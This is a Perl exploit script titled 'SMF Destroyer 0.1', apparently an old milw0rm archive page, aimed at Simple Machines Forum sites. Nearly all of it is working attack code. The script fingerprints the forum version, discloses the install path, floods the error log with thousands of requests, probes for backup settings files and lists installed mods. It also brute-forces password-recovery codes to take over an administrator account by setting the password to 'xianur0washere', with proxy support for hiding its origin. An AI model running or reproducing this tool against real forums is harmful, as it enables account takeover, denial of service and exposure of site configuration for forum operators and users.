<html><head><title>Simple Machines Forum - Destroyer 0.1</title></head><pre>#!/usr/bin/perl

    use LWP::UserAgent;
    use Getopt::Std;
    use LWP::Simple;
    use HTTP::Request;

#Author: Xianur0
#Uxmal666[at]gmail.com
# Cracks links Password Recovery
# Find Temporary Files executed by mods
# DB function Flood by Error Log
# File Path Disclosure
# List installed Mods (Useful To Find Mods Vulnerable)
# etc. ..

print &quot;\n\n\x09\x09\x09\x09\x09SMF Destroyer 0.1 By Xianur0 [Priv8]\n\n&quot;;
my $url = $ARGV[1] || die (&quot;Use: smf.pl [option] [Full URL]
[Proxy:Puerto]\nOptions:\n-f Flood \n-p Search Directory Setup \n-l
Installed Mods List \n-b Find Temporary\n-c  Cracks links Password
Recovery (Recommended Use Proxy)&quot;);
version();
my $proxy = $ARGV[2] || &quot;&quot;;
if($ARGV[0] ne &quot;-c&quot; &amp;&amp; $proxy ne &quot;&quot;) {
$ua-&gt;proxy([&quot;http&quot;], &quot;http://&quot;.$proxy);
}

    getopts('fplbc', \%opt);
    crackeador() if $opt{c};
    flood() if $opt{f};
    path() if $opt{p};
    list() if $opt{l};
    temp() if $opt{b};

sub headers {
$req-&gt;header('Accept' =&gt; 'text/html');
$req-&gt;header('Accept-Language' =&gt; 'es-es,es;q=0.8,en-us;q=0.5,en;q=0.3');
}

sub version {
$ua = LWP::UserAgent-&gt;new;
$ua-&gt;agent('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.12)
Gecko/20080201 Firefox/2.0.0.12');
$req = HTTP::Request-&gt;new(GET =&gt; $url);
&amp;headers;
$res = $ua-&gt;request($req);
if ($res-&gt;is_success) {
 my $html = $res-&gt;content;
if ($html =~ /title=&quot;Simple Machines Forum&quot; target=&quot;_blank&quot;&gt;Powered by
SMF (.*?)&lt;\/a&gt;/){
$version = $1;
print &quot;\n[X] SMF Version: $version\n&quot;;
if($version &lt; &quot;1.1.7&quot;) {
print &quot;\n[X] Outdated Version $version!!!!!!!!!!!\n\n[X]
http://milw0rm.com/search.php?dong=smf&quot;.$version.&quot;\n\n&quot;;
}
}}}

sub path {
$req = HTTP::Request-&gt;new(GET =&gt; $url.'/SSI.php?ssi_layers');
&amp;headers;
$res = $ua-&gt;request($req);
if ($res-&gt;is_success) {
 my $html = $res-&gt;content;
if ($html =~ /Undefined variable: ssi_layers in &lt;b&gt;(.*?)SSI.php/){
print &quot;[X] Directory: $1\n&quot;;
} else { print &quot;[!] Getting error Directory!\n&quot;;}
}
}

sub flood {
print &quot;[X] Starting Flood! (Press Ctrl + C To Finish)\n&quot;;
$texto = &quot;Flood!!!!!&quot; x 15;
$req = HTTP::Request-&gt;new(GET =&gt;
$url.'/index.php?action=help;page['.$texto.']=loginout');
&amp;headers;
for($i = 1; $i&lt;10000; $i++) {
$res = $ua-&gt;request($req);
if ($res-&gt;is_success) {
print &quot;[-] Sent: &quot;.$i.&quot;\n&quot;;
} else {
print &quot;[!] HTTP Error Query: &quot; . $res-&gt;status_line . &quot;\n&quot;;
}
}
}


sub temp {
@temps=('index.php~','Settings.php~','Settings_bak.php~');
foreach $temp (@temps) {
$req = HTTP::Request-&gt;new(GET =&gt; $url.&quot;/&quot;.$temp);
&amp;headers;
$res = $ua-&gt;request($req);
if ($res-&gt;is_success) {
print &quot;[X] Temporary File Found: &quot;.$url.&quot;/&quot;.$temp.&quot;\n&quot;;
} else {print &quot;[!] Not Found: &quot;.$url.&quot;/&quot;.$temp.&quot;\n&quot;;}
}
}

sub list {
$req = HTTP::Request-&gt;new(GET =&gt; $url.&quot;/Packages/installed.list&quot;);
&amp;headers;
$res = $ua-&gt;request($req);
if ($res-&gt;is_success) {
 my $html = $res-&gt;content;
my @htmls = split(&quot;\n&quot;, $html);
foreach $mod (@htmls) {
my @mod = split('\|\^\|', $mod);
print &quot;[X]Package:\nDescription: $mod[0]\nFile:
$url/Packages/$mod[1]\nName: $mod[2]\nVersion: $mod[3]\n\n&quot;;

}
}
}

sub crackeador() {
$url = $ARGV[0];
$nick = $ARGV[1];
$id = $ARGV[2] || die(&quot;Use: smf.pl -c [URL SMF] [Nick Admin] [ID
Admin] [Proxy:Puerto]\nExample: smf.pl -p
http://www.simplemachines.org/community/ dschwab9 179
www.carlosslim.com:3128\n&quot;);
my $reminder = $url.&quot;?action=reminder&quot;;
my $smf = $reminder.&quot;;sa=setpassword;u=&quot;.$id.&quot;;code=&quot;;
my $proxy = $ARGV[3];
if($proxy ne &quot;&quot;) {
$ua-&gt;proxy([&quot;http&quot;], &quot;http://&quot;.$proxy);
}

sub mail() {
my $content = HTTP::Request-&gt;new(GET =&gt; $reminder);
$contenedor = $ua-&gt;request($content)-&gt;as_string;
if ($contenedor =~ /Set-Cookie: (.*?)
/){
        print &quot;\n[+] SESSION Detected: $1\n&quot;;
$session = $1;
} else { die &quot;[!] SESSION could not be found!\n&quot;;}
if ($contenedor =~ /&lt;input type=&quot;hidden&quot; name=&quot;sc&quot; value=&quot;(.*?)&quot;/){
        print &quot;\n[+] sc Detected: $1\n&quot;;
    $sc = $1;
} else { die &quot;[!] SC could not be found!\n&quot;;}
my $req = HTTP::Request-&gt;new(POST =&gt; $reminder.';sa=mail');
  $req-&gt;content_type('application/x-www-form-urlencoded');
  $req-&gt;content('user='.$nick.'&amp;sc='.$sc.'&amp;=enviar');
  $req-&gt;header('Cookie' =&gt; $session);
my $res = $ua-&gt;request($req)-&gt;as_string;
if(!$res) {exit;}
print &quot;[x]Sent!\n&quot;;

}

sub generador() {
my $password = &quot;&quot;;
my @chars = split(&quot; &quot;,
    &quot;0 1 2 3 4 5 6 7 8 9 a b c d e
    f g h i j k l m n o p q r s t
    u v w x y z&quot;);
for (my $i=0; $i &lt; 10 ;$i++) {
    $_rand = int(rand 35);
    $password .= $chars[$_rand];
}
return $password;
}

sub brute() {
while($bucle ne &quot;finito&quot;) {
$code = generador();
    my $fuente = $reminder.&quot;;sa=setpassword;u=&quot;.$id.&quot;;code=&quot;.$code;
    my $content = HTTP::Request-&gt;new(GET =&gt; $reminder);
    my $content = $ua-&gt;request($content)-&gt;as_string;
if ($content =~ /&lt;input type=&quot;hidden&quot; name=&quot;sc&quot; value=&quot;(.*?)&quot;/){
    $sc = $1;
} else { die &quot;[!] SC could not be found!\n&quot;;}
if ($content =~ /Set-Cookie: (.*?)
/){
        print &quot;\n[+] New SESSION Detected: $1\n&quot;;
$session = $1;
} else { die &quot;[!] SESSION could not be found!\n&quot;;}
print &quot;[+] Testing Code: &quot;.$code.&quot;\n&quot;;
my $req = HTTP::Request-&gt;new(POST =&gt; $reminder.';sa=mail');
  $req-&gt;content_type('application/x-www-form-urlencoded');
  $req-&gt;content('passwrd1=xianur0washere&amp;passwrd2=xianur0washere&amp;code='.$code.'&amp;u='.$id.'&amp;sc='.$sc);
  $req-&gt;header('Cookie' =&gt; $session);
  $res = $ua-&gt;request($req);
  if ($res-&gt;is_success) {
     if($res-&gt;content =~ '&lt;input type=&quot;text&quot; name=&quot;user&quot; size=&quot;20&quot; value=&quot;') {
print &quot;[-] Password Changed!\n[x] New password: xianur0washere\nUsername: $1\n&quot;;
exit;
}
} else { die &quot;[!] HTTP response incorrect!\n&quot;;}}}

print &quot;\n[-] Sending Mail...\n\n&quot;;
mail();
print &quot;\n[-] Attacking code link recovery...\n&quot;;
brute();
}

# milw0rm.com [2009-01-12]</pre></html>